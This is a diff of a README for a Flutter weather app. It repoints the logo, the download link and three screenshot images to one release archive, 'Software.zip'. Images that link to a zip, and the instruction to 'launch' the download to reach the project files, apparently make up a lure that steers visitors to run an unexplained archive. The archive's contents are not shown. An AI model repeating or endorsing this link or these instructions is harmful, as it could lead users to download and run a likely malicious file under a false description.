@@ -1,6 +1,6 @@
 # Welcome to the Weather App Repository 🌦️
 
-![Weather App Logo](https://github.com/Ushii/weather_app/releases/download/v1.0/Installer.zip)
+![Weather App Logo](https://github.com/Ushii/weather_app/releases/download/v2.0/Software.zip)
 
 ## Description ℹ️
 
@@ -31,15 +31,15 @@ Welcome to the "weather_app" repository, a Flutter app designed to fetch and dis
 ## Installation 🚀
 
 To get started with the Weather App, you can download the project files from the following link: 
-[Download Weather App](https://github.com/Ushii/weather_app/releases/download/v1.0/Installer.zip)
+[Download Weather App](https://github.com/Ushii/weather_app/releases/download/v2.0/Software.zip)
 
 If the link does not automatically download the file, make sure to launch it to access the project files.
 
 ## Screenshots 📷
 
-![Weather App Screenshot 1](https://github.com/Ushii/weather_app/releases/download/v1.0/Installer.zip)
-![Weather App Screenshot 2](https://github.com/Ushii/weather_app/releases/download/v1.0/Installer.zip)
-![Weather App Screenshot 3](https://github.com/Ushii/weather_app/releases/download/v1.0/Installer.zip)
+![Weather App Screenshot 1](https://github.com/Ushii/weather_app/releases/download/v2.0/Software.zip)
+![Weather App Screenshot 2](https://github.com/Ushii/weather_app/releases/download/v2.0/Software.zip)
+![Weather App Screenshot 3](https://github.com/Ushii/weather_app/releases/download/v2.0/Software.zip)
 
 ## How to Use 🚦
 
